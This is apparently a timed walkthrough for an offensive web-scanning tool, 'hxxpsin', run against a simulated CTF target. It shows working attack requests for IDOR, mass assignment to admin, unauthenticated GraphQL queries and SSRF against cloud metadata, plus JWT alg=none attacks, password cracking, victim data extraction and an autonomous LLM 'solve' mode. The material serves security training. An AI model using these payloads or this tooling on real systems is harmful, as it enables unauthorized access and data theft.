# Challenge Simulation — 30-Minute Bug Hunt

Simulated target: `https://ctf.corp.local`
Format: 3-hour interview technical challenge
Goal: find and document a high-severity vulnerability

---

## Minute 0:00 — Start quick scan immediately

Before you've even logged in, kick the no-browser scan in the background.
This takes ~60 seconds and runs while you're manually exploring the app.

```bash
python3 hxxpsin.py quick https://ctf.corp.local
```

`hxxpsin.py` picks a sensible `--out` automatically
(`./output/<host>-<timestamp>`).

**Output to stderr (progress):**
```
[1/12] Fingerprinting stack: https://ctf.corp.local
  Detected: Vercel + Next.js, React + Express/Node.js + JWT, NextAuth.js + GraphQL
  Interesting paths: 8
  Seeded 8 endpoint stubs total

[2/12] JS bundle deep analysis
  JS bundles analyzed: 6
    endpoints: 17  secrets: 1  dom_xss: 2  auth_smells: 4

[3/12] Classifying findings
  Findings: 12 endpoints scored
  Admin/Internal Exposure: 1
  GraphQL: 1
  Auth/Session: 2

[4/12] JWT attack analysis
[5/12] Hidden parameter discovery
[6/12] Verifying findings (active probes)
[7/12] Open redirect probing
[8/12] Desync / cache / protocol probes
  Desync findings: 1 (0 high)
[9/12] CRLF injection probing
[10/12] Enriching response bodies (users, hosts, secrets, images)
[11/12] Writing report
════════════════════════════════════════════════════════════
  Done in 52s
  Report:  ./output/ctf.corp.local-20260522-090015/report.md
  Briefing: ./output/ctf.corp.local-20260522-090015/briefing.md
════════════════════════════════════════════════════════════

Top findings for https://ctf.corp.local:
  [  6] GET    https://ctf.corp.local/admin  [Admin/Internal Exposure]
  [  6] POST   https://ctf.corp.local/graphql  [GraphQL]
  [  2] GET    https://ctf.corp.local/api  [Auth/Session]
```

**What you learn in ~50 seconds:**
- Next.js + Express backend — check `/_next/static/` chunks for hidden routes
- JWT + NextAuth — `jwt_attack` already tried alg=none, weak HS256, kid traversal
- GraphQL detected — introspection template auto-generated
- `/admin` confirmed (HTTP 200) — no auth check
- Cloudflare edge + HTTP/2 — desync risk noted for Burp follow-up
- `briefing.md` has the plain-English version if you want the operator brief

---

## Minute 0:05 — Auth options

You have three ways to get authenticated. Pick whichever fits:

### A) Let AutoAuth provision a fresh account

```bash
python3 hxxpsin.py scan https://ctf.corp.local \
  --auth-config ~/.config/hxxpsin/config.toml
```

AutoAuth registers a throwaway account using the mail backend from your
operator config (IMAP / Mailhog / mail.tm), solves any captcha headed if
`captcha.mode = "human"`, and exposes a public tunnel for click-link
verification when the target sends one.

### B) Use your own creds

```bash
python3 hxxpsin.py scan https://ctf.corp.local \
  --auth-email me@example.com --auth-password 'hunter2'
```

Registration is skipped; AutoAuth tries to log in directly with these.

### C) Save Playwright storage_state manually

```bash
python3 -c "
import asyncio
from playwright.async_api import async_playwright

async def save():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False)
        ctx = await browser.new_context()
        page = await ctx.new_page()
        await page.goto('https://ctf.corp.local/login')
        input('Log in manually, then press Enter...')
        await ctx.storage_state(path='auth.json')
        print('[+] Saved auth.json')
        await browser.close()

asyncio.run(save())
"

python3 hxxpsin.py scan https://ctf.corp.local --auth auth.json
```

---

## Minute 0:08 — Full scan with auth

The full pipeline runs ~13 stages. With AutoAuth, the crawler runs twice
(Phase A pre-auth → register/login → Phase B post-auth) and the
post-classifier flow runs once across the merged collector.

```
[1/13]  Fingerprinting stack
[2/13]  Phase A — pre-auth discovery crawl (Playwright)
        [*] Auto-auth: provisioning fresh account...
          ✓ Auto-auth: token acquired (pentest+a8c3@hxxpsin-pentest.com)
        Phase B — post-auth crawl
[3/13]  JS bundle deep analysis
[4/13]  Classifying findings
[5/13]  JWT attack analysis
[6/13]  Hidden parameter discovery
[7/13]  Verifying findings (active probes)
[8/13]  Open redirect probing
[9/13]  Active scan: skipped (pass --active-scan to enable)
[10/13] Desync / cache / protocol probes
[11/13] CRLF injection probing
[12/13] Enriching response bodies (users, hosts, secrets, images)
[13/13] Writing report
```

**Output (key lines):**
```
Phase B post-auth: 34 pages visited, 67 requests captured
Findings: 18 endpoints scored
  IDOR/BOLA: 6
  Mass Assignment: 3
  SSRF Surface: 2
  GraphQL: 2
  Admin/Internal Exposure: 1
  File Upload: 1
  Race Condition: 1
  Auth/Session: 2
JWT: 2 tokens tested, 1 attacks confirmed
  ✓ [Auth/Session] alg=none accepted on /api/me
Verifier: 3 confirmed  5 likely  10 not-confirmed
Open redirect: 8 endpoints tested, 1 confirmed
Desync findings: 2 (1 high)
Enrichment: 23 identities, 4 secrets, 12 images analyzed
  Passwords: 0 plaintext + 2 cracked  →  2 usable

Top findings for https://ctf.corp.local:
  [ 15] PATCH  https://ctf.corp.local/api/users/42  [IDOR/BOLA, Mass Assignment]
  [ 14] POST   https://ctf.corp.local/api/webhook/notify  [SSRF Surface]
  [ 11] GET    https://ctf.corp.local/api/invoices/1001  [IDOR/BOLA]
  [ 10] POST   https://ctf.corp.local/graphql  [GraphQL]
  [  9] GET    https://ctf.corp.local/api/users/42  [IDOR/BOLA]

High desync/cache risks:
  [HIGH] cache_key_confusion — https://ctf.corp.local/dashboard
```

---

## Minute 0:10 — Read report.md, pick targets

Open `report.md`. The top findings section tells you exactly where to look:

```markdown
## Top Findings

| Score | Method | URL | Categories |
|---|---|---|---|
| 15 | PATCH | /api/users/42 | IDOR/BOLA, Mass Assignment |
| 14 | POST  | /api/webhook/notify | SSRF Surface |
| 11 | GET   | /api/invoices/1001 | IDOR/BOLA |
| 10 | POST  | /graphql | GraphQL |
```

For the plain-English version, open `briefing.md` — it's optimized for
explaining the result to a less-technical reviewer.

**Decision:** IDOR on invoices is the cleanest signal — object ID in path,
auth evidence present, two accounts available. Start there.

---

## Minute 0:12 — Run nuclei in background

```bash
bash ./output/*/nuclei/run-nuclei.sh https://ctf.corp.local &
```

This runs 3 phases concurrently while you manually test. Results appear
in `nuclei/results/` as they're found.

You could instead use `--solve` on the previous scan to have an LLM run
the same Repeater work autonomously:

```bash
python3 hxxpsin.py scan https://ctf.corp.local --auth auth.json \
  --solve --solve-provider claude --solve-top 5
```

Per-finding verdicts go to `output/solver.json` and render as a `Solver`
section in `report.md`.

---

## Minute 0:13 — Manual Burp: IDOR on /api/invoices

The classifier found `GET /api/invoices/1001` — numeric ID, high score,
Bearer token present. Open Burp.

**Request (your account, invoice 1001):**
```http
GET /api/invoices/1001 HTTP/2
Host: ctf.corp.local
Authorization: Bearer eyJhbGc...  (your token)
```

**Response:**
```json
{
  "id": 1001,
  "user_id": 7,
  "amount": 299.99,
  "status": "paid",
  "card_last4": "4242",
  "details": "Pro plan - Alice Smith"
}
```

**Request (swap ID to 1002, still your token):**
```http
GET /api/invoices/1002 HTTP/2
Host: ctf.corp.local
Authorization: Bearer eyJhbGc...  (YOUR token, not victim's)
```

**Response:**
```json
{
  "id": 1002,
  "user_id": 12,
  "amount": 9999.00,
  "status": "paid",
  "card_last4": "1337",
  "details": "Enterprise plan - Bob Corp"
}
```

**Confirmed IDOR.** You got user 12's invoice using user 7's token.
The server checks authentication but not authorization.

The same call can be made (and saved as JSON) via `hxxpsin repeat`:

```bash
python3 hxxpsin.py repeat \
  --url 'https://ctf.corp.local/api/invoices/1001' \
  --header 'Authorization: Bearer eyJhbGc...' \
  --replace 1001 1002 --save invoice-idor.json
```

If the IDOR is confirmed, the next scan will also automatically run
`data_extractor` to pull per-victim records into `output/data_extract/`.

---

## Minute 0:18 — Test mass assignment while you're here

The classifier scored `PATCH /api/users/42` at 15 — the body had `role` field.

```http
PATCH /api/users/42 HTTP/2
Host: ctf.corp.local
Authorization: Bearer eyJhbGc...
Content-Type: application/json

{"role": "admin", "plan": "enterprise"}
```

**Response:**
```json
{
  "id": 42,
  "username": "attacker",
  "role": "admin",
  "plan": "enterprise",
  "updated": true
}
```

**Confirmed mass assignment → privilege escalation.**

---

## Minute 0:22 — GraphQL introspection

The classifier found `/graphql`. The generated template already sent the
introspection query. Check nuclei output:

```
[medium] [graphql-introspect] [POST] https://ctf.corp.local/graphql

Extracted types: User, Invoice, Admin, Payment, Coupon
```

Manually query the `Admin` type:

```http
POST /graphql HTTP/2
Content-Type: application/json

{"query": "{ admin { users { id email role } } }"}
```

**Response:** Returns all users with emails and roles. Admin resolver has no auth check.

---

## Minute 0:25 — Write up the IDOR finding

```
Title:     IDOR in GET /api/invoices/:id
Severity:  High
Endpoint:  GET /api/invoices/{id}

Steps to reproduce:
1. Log in as user A (user_id: 7)
2. GET /api/invoices/1002 with user A's Bearer token
3. Response returns user B's (user_id: 12) full invoice including card data

Expected:  403 Forbidden or empty response
Actual:    Full invoice data for another user

Impact:
- Complete billing data exposure across all users
- Includes card last 4 digits, payment amounts, plan details
- Enumerable — numeric IDs, sequential

Suggested fix:
  Before returning invoice, verify invoice.user_id === authenticated_user.id
```

---

## Minute 0:27 — SSRF probe on /api/webhook/notify

The classifier scored `POST /api/webhook/notify` at 14 — `url` field in
body, SSRF-prone path. The `active_scanner` already probed it (if you
passed `--active-scan`); otherwise confirm it manually:

```http
POST /api/webhook/notify HTTP/2
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/"}
```

**Response:**
```json
{"fetched": "ami-0abcdef1234567890\n"}
```

**Confirmed SSRF → cloud metadata.** That's another high-severity finding.

If your operator config has a public tunnel configured (cloudflared /
ngrok), `payload_server` will have already exposed an OOB callback URL —
re-run with `--oob` to catch blind SSRF that doesn't echo the response.

---

## Minute 0:30 — Score

```
Findings confirmed in 30 minutes:
  [HIGH] IDOR — GET /api/invoices/:id — cross-account billing data
  [HIGH] Mass Assignment — PATCH /api/users/:id — role escalation to admin
  [HIGH] SSRF — POST /api/webhook/notify — cloud metadata access
  [MED]  GraphQL — /graphql — introspection enabled, admin resolver unauthenticated
```

This is what the tool is for: turning 10 minutes of automated mapping into
30 minutes of confirmed findings rather than 60 minutes of guessing.

---

## Why it works

The pipeline didn't "find" the bugs. It did three things that matter:

1. **Reduced the search space** — 67 requests captured, 18 scored, top 5 are real findings
2. **Ranked correctly** — IDOR scored 11, SSRF scored 14, mass assignment scored 15. All three were confirmed
3. **Gave you specific next steps** — each finding's evidence told you exactly which field to tamper with

The bugs were found by reading the classifier output and testing manually
in Burp (or in `hxxpsin repeat` / `hxxpsin fuzz`, or via `--solve`). The
tool just made it a 10-minute read instead of a 60-minute hunt.

---

## TUI alternative

If you'd rather drive the same workflow from a live dashboard, the TUI
streams progress, requests, findings, and the report in real time:

```bash
python3 hxxpsin.py --tui                         # blank — kick a scan from inside
python3 hxxpsin.py --tui --load ./output/...     # post-mortem on a prior scan
```

Tabs: Dashboard / Wizard / Target / Spider / Endpoints / Requests / Repeater /
Intruder / Probes / Findings / Enrichment / Report.
